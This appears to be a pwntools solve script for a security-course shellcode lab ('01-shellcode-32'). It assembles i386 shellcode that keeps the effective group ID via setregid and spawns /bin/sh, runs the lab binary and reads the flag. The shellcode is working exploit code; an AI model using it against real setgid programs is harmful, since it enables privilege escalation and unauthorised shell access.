#!/usr/bin/env python3
from pwn import asm, context, process
import os

context.update(arch="i386", os="linux")
shellcode = asm("""
    /* setregid(getegid(), getegid()) */
    mov     eax, 0x32          /* sys_getegid = 50, make it 32 bits */
    int     0x80               /* eax <- egid */
    mov     ebx, eax           /* rgid = egid */
    mov     ecx, eax           /* egid = egid */
    mov     eax, 0x47          /* sys_setregid = 71 */
    int     0x80

    /* execve("/bin/sh", 0, 0) */
    push    0                  /* NUL terminator */
    push    0x68732f2f         /* "//sh" */
    push    0x6e69622f         /* "/bin" */
    mov     ebx, esp           /* filename */
    mov     ecx, 0             /* argv = 0 */
    mov     edx, 0             /* envp = 0 */
    mov     eax, 0x0b          /* sys_execve = 11 */
    int     0x80
""")

shellcode = asm(r"""

mov     eax, 0x32         
int     0x80               
mov     ebx, eax           
mov     ecx, eax           
mov     eax, 0x47         
int     0x80

push    0x0                
push    0x68732f2f         
push    0x6e69622f         
mov     ebx, esp           
mov     ecx, 0            
mov     edx, 0             
mov     eax, 0x0b         
int     0x80
""")

outpath = os.path.abspath("shellcode.bin")
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
p = process(['./01-shellcode-32'], env={'PATH':'/bin:/usr/bin'})
p.sendline(b"cat flag")
flag = p.recvline_regex(b"[Cc][Ss]6332{.*}").decode()
print("Flag:", flag)
# print(f"Wrote {len(shellcode)} bytes to {outpath}")
